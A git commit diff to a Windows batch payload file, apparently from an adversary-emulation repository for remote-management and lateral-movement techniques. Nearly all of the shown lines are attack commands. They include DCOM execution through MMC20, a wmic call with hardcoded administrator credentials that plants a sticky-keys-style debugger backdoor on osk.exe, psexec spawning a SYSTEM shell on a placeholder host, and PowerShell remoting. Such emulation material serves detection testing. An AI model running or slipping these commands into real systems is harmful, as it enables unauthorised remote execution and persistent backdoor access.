3c69b357cac6269a2ca55949afa8706a7a47b635
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 12:51:26 +0530

    Update T1028.bat

--- Payloads/T1028/T1028.bat
+++ Payloads/T1028/T1028.bat
@@ -11,7 +11,7 @@ ECHO -------------------------------------------------------------------
 cmd /c powershell Enable-PSRemoting -Force
 powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","127.0.0.1")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
 wmic /user:DOMAIN\Administrator /password:pass123 /node:127.0.0.1 process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
-psexec \\host -u DOMAIN\Administrator -p password -s cmd.exe
+%Utilities%psexec \\host -u DOMAIN\Administrator -p password -s cmd.exe
 powershell.exe invoke-command -computername "127.0.0.1" -scriptblock {ipconfig}
 ECHO.
 
